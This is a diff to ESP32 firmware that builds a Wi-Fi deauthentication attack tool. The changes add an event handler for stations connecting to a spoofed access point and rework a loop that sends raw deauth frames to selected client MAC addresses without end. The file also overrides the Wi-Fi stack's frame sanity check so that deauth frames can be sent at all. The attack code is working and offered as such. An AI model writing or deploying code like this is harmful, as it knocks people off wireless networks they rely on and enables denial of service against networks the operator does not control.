@@ -6,10 +6,8 @@
 #include <beaconFrame.h>
 #include <apInfo.h>
 #include <BLEControl.h>
-#include <WiFi.h>
-#include "esp_netif.h"
-#include <lwip/netif.h>
-#include <lwip/sockets.h>
+#include "esp_event.h"
+
 
 #if ARDUINO_USB_CDC_ON_BOOT != 1
 #warning "If you need to monitor printed data, be sure to set USB CDC On boot to ENABLE, otherwise you will not see any data in the serial monitor"
@@ -59,6 +57,7 @@ uint8_t deauthClients[50][6]; //Store client mac addresses
 int numDeauthClients = 0;
 int selectedApNum = -1; //If value is -1, an ap has not been selected
 int spoofAll; //determines if deauth packet is send to broadcast address or specific clients
+static EventGroupHandle_t apEventGroup; //handle ap events
 
 static const uint8_t rawDeauthFrame[] = {
     0xc0, 0x00, //frame control 
@@ -430,6 +429,33 @@ void selectAllDeauthClients() {
     }
 }
 
+void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+    Serial.println("AP cb called");
+    if(event_id == WIFI_EVENT_AP_STACONNECTED) {
+        Serial.println("AP_CONNETed event");
+        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t*) event_data;
+        char message[50];
+        snprintf(message, 50, "Station %s Connected.\n", MAC2STR(event->mac));
+        sendMsg(message);
+    }
+    else if(event_id == WIFI_EVENT_AP_STADISCONNECTED) {
+        Serial.println("AP_disCONNETed event");
+        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t*) event_data;
+        char message[50];
+        /*
+        snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x: Disconnected.\n", event->mac[0], 
+                                                                            event->mac[1],
+                                                                            event->mac[2],
+                                                                            event->mac[3],
+                                                                            event->mac[4],
+                                                                            event->mac[5]
+                                                                            );
+        sendMsg(message);
+        */
+        sendMsg("Disconnect Eevnt");
+    }
+}
+
 
 //bypass sanity check that prevents deauth frames from being transmitted
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
@@ -438,6 +464,15 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 
 
 void startAPSpoof() {
+    esp_event_loop_create_default();
+    apEventGroup = xEventGroupCreate();
+    esp_event_handler_instance_register(
+        WIFI_EVENT,
+        ESP_EVENT_ANY_ID,
+        &ap_event_cb,
+        NULL,
+        NULL
+        );
     esp_wifi_start();
 
     //const void *buffer = &rawDeauthFrame;
@@ -457,14 +492,14 @@ void startAPSpoof() {
     Serial.println("Startung deauth test");
     switch(spoofAll) {
         case 0:
-            for(int i = 0; i < clientCount; i++) {
-                apInfo.getClient(&deauthFrame[4], selectedApNum, i);
-
+            for(int i = 0; i < numDeauthClients; i++) {
+                Serial.printf("Selecting client %i\n", i);
+                memcpy(&deauthFrame[4], deauthClients[i], 6);
                 esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
                 delay(10);
 
                 if(i == clientCount-1) {
-                    i = 0;
+                    i = -1;
                 }
             }
             break;
